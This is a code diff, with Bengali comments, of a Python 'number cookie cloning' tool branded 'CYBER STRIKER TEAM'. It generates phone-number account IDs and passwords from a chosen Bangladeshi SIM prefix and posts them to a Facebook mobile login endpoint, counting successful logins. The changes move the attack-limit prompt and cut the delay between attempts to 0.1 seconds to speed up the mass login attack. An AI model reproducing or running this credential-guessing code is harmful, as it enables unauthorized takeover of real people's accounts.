@@ -30,33 +30,33 @@ def banner():
 
 def main():
     banner()
+    # স্ক্রিনশট অনুযায়ী নিচের অংশটুকু সাজানো হয়েছে
     print(f'{R}[•] {G}SALAMU ALAIKUM...................{W}')
     print(f'{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
     print(f'{R}[•] {G}CYBER STRIKER TEAM................{W}')
     print(f'{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
-    print(f'{G}[1] NUMBER COOKIE CLONING')
-    print(f'[0] EXIT')
-    print(f'×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
     
-    choose = input(f'{R}[▼] {G}CHOOSE : {W}')
-    if choose == '1':
-        cloning_start()
-    elif choose == '0':
-        sys.exit()
-    else:
+    # স্ক্রিনশটের মতো EXAMPLE এবং CLONING LIMIT ইনপুট
+    print(f'{R}[•] {G}EXAMPLE : [ {W}10000, {Y}20000, {G}50000 {G}]{W}')
+    print(f'{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
+    limit_input = input(f'{R}[•] {G}PUT CLONING LIMIT: {W}')
+    
+    try:
+        limit = int(limit_input)
+        cloning_start(limit)
+    except ValueError:
+        print(f"\n{R}[!] অনুগ্রহ করে সঠিক সংখ্যা দিন।")
+        time.sleep(2)
         main()
 
-def cloning_start():
+def cloning_start(limit):
     print(f'\n{G}[+] EXAMPLE : 017, 018, 019, 016')
     code = input(f'[+] ENTER SIM CODE : {W}')
-    print(f'{G}[+] EXAMPLE : 500, 1000, 100000') 
-    limit = int(input(f'[+] ENTER CLONING LIMIT : {W}'))
     
     print(f'\n{G}[/] ATTACK STARTED ON CODE {code}...')
     print(f'[/] TOTAL TARGET : {limit}\n')
 
     ok = 0
-    # CP কাউন্টারটি কোড থেকে সরিয়ে দেওয়া হয়েছে
 
     for i in range(limit):
         loop = i + 1
@@ -73,7 +73,6 @@ def cloning_start():
         data = {'email': uid, 'pass': pws}
         url = "https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
         
-        # এখানে [CP:XX] অংশটি রিমুভ করা হয়েছে
         sys.stdout.write(f'\r{G}[MALEK-RUNNING] {loop}/{limit} [OK:{ok}]'); sys.stdout.flush()
 
         try:
@@ -91,7 +90,6 @@ def cloning_start():
         except:
             pass
 
-        # স্পিড বাড়ানোর জন্য টাইম স্লিপ ০.১ সেকেন্ড করা হয়েছে
         time.sleep(0.1)
 
     print(f'\n\n{G}-----------------------------------')
